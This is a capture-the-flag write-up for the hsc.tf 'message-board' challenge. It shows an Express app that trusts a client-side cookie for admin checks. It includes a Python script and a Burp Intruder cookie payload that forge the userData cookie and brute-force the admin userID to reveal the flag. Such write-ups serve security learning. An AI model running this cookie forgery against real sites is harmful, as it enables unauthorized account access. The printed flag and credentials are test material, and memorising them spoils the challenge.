# Challenge Name: message-board

## Description

Your employer, LameCompany, has lots of gossip on its company message board: message-board.hsc.tf. You, Kupatergent, are able to access some of the tea, but not all of it! Unsatisfied, you figure that the admin user must have access to ALL of the tea. Your goal is to find the tea you've been missing out on.

Your login credentials: username: kupatergent password: gandal

Server code is attached (slightly modified).

[message-board-master.zip](message-board-master.zip)

## Detailed solution

Start by opening the challenge link https://message-board.hsc.tf/  

![image](https://i.imgur.com/3vM0W8A.png)

We have a login page https://message-board.hsc.tf/login  

![image](https://i.imgur.com/iLWhsUS.png)

It's a normal login form that use POST request  

```html
    <form action="/login" method="POST">
        <div class="mb-3">
            <label class="form-label" for="username">Username</label>
            <input class="form-control" type="text" name="username" id="">
        </div>
        <div class="mb-3">
            <label class="form-label" for="password">Password</label>
            <input class="form-control" type="password" name="password" id="">
        </div>
        <button class="btn btn-primary" type="submit">Login</button>
        <p class="form-text">Gossip abounds</p>
    </form>
```

Now let's check the source code [message-board-master.zip](message-board-master.zip) 

It's a Express-NodeJS web application let's see the app.js 

```js
const express = require("express")
const cookieParser = require("cookie-parser")
const ejs = require("ejs")
require("dotenv").config()

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(cookieParser())
app.set("view engine", "ejs")
app.use(express.static("public"))

const users = [
    {
        userID: "972",
        username: "kupatergent",
        password: "gandal"
    },
    {
        userID: "***",
        username: "admin"
    }
]

app.get("/", (req, res) => {
    const admin = users.find(u => u.username === "admin")
    if(req.cookies && req.cookies.userData && req.cookies.userData.userID) {
        const {userID, username} = req.cookies.userData
        if(req.cookies.userData.userID === admin.userID) res.render("home.ejs", {username: username, flag: process.env.FLAG})
        else res.render("home.ejs", {username: username, flag: "no flag for you"})
    } else {
        res.render("unauth.ejs")
    }
})

app.route("/login")
.get((req, res) => {
    if(req.cookies.userData && req.cookies.userData.userID) {
        res.redirect("/")
    } else {
        res.render("login.ejs", {err: false})
    }
})
.post((req, res)=> {
    const request = {
        username: req.body.username,
        password: req.body.password
    }
    const user = users.find(u => (u.username === request.username && u.password === request.password))
    if(user) {
        res.cookie("userData", {userID: user.userID, username: user.username})
        res.redirect("/")
    } else {
        res.render("login", {err: true}) // didn't work!
    }
})

app.get("/logout", (req, res) => {
    res.clearCookie("userData")
    res.redirect("/login")
}) 

app.listen(3000, (err) => {
    if (err) console.log(err);
    else console.log("connected at 3000 :)");
})
```  

The login POST request test if the usersname and password exist in the ``` const users ``` 

As we can users has **kupatergent** and admin, the password and userID for the admin has been edited for the challenge  

So we have only the login ```kupatergent:gandal``` 

![image](https://i.imgur.com/PApyqmJ.png)

After login in using ```kupatergent:gandal``` we can the message no flag for you 

```js
app.get("/", (req, res) => {
    const admin = users.find(u => u.username === "admin")
    if(req.cookies && req.cookies.userData && req.cookies.userData.userID) {
        const {userID, username} = req.cookies.userData
        if(req.cookies.userData.userID === admin.userID) res.render("home.ejs", {username: username, flag: process.env.FLAG})
        else res.render("home.ejs", {username: username, flag: "no flag for you"})
    } else {
        res.render("unauth.ejs")
    }
})
``` 
As we can see if we acces the home page a test check our cookie and extract the userID and username and compare them to username and userID of the admin 

If our cookie has the admin username and userID we gonna see the flag 

A cookie has been generated after login in ```kupatergent:gandal``` we can see it in dev tools 

```
userData=j%3A%7B%22userID%22%3A%22972%22%2C%22username%22%3A%22kupatergent%22%7D
``` 

It's url encoded let's decode it 
  
```
j:{"userID":"972","username":"kupatergent"}
```  

As we can the cookie has the userID and the username. So to be able to get the flag we need to craft a cookie with 

j:{"userID":"X","username":"admin"} as X is admin userID 

So we need to bruteforce the userID until we got a page with flag 

```python
import requests
from requests.structures import CaseInsensitiveDict

url = "https://message-board.hsc.tf/"

headers = CaseInsensitiveDict()

for i in range(0, 999):
    print("userID = " + str(i) ) 
    headers["Cookie"] = "userData=j:%7B%22userID%22:%22" + str(i)+ "%22,%22username%22:%22admin%22%7D"
    resp = requests.get(url, headers=headers)
    page = resp.content.decode("utf-8")
    if page.find("no flag for you") != 1429:
        print(page)
        break
``` 

![image](https://i.imgur.com/fb65OaS.png)


We got admin userID which is 768 and the flag 


## Flag

```
flag{y4m_y4m_c00k13s}
```



## OR


I logged in using the given credentials.

Found a cookie named userData with userID and username

![](https://i.imgur.com/gcZthM9.png)

here userID is `972` and username is `kupatergent`

Now i started looking into the given server code files and in one of the files named app.js
i found this:

![](https://i.imgur.com/EwHdN4D.png)

that indicates that we don’t need password for admin access we just need the correct user id.

So, now i fired up BurpSuite sent the request with cookie to the intruder replaced the username with admin and set the payload parameter at userID

```
Cookie: userData=j%3A%7B%22userID%22%3A%22§9§%22%2C%22username%22%3A%22admin%22%7D
```
![](https://i.imgur.com/htFr2IA.png)

Payload settings:

![](https://i.imgur.com/vs6kf6S.png)

Also set up a grep match for flag{ as that is the starting of the flag

![](https://i.imgur.com/YJmEAdV.png)

And now we have to look for a ticked checkbox for flag{ and in the response section of that response we have the flag

![](https://i.imgur.com/sBY1hJl.png)

here we have the flag, we can confirm it on the website by changing the cookie values:

```
userID = 768
username = admin
```

![](https://i.imgur.com/mGrqaU2.png)


```
flag{y4m_y4m_c00k13s}
```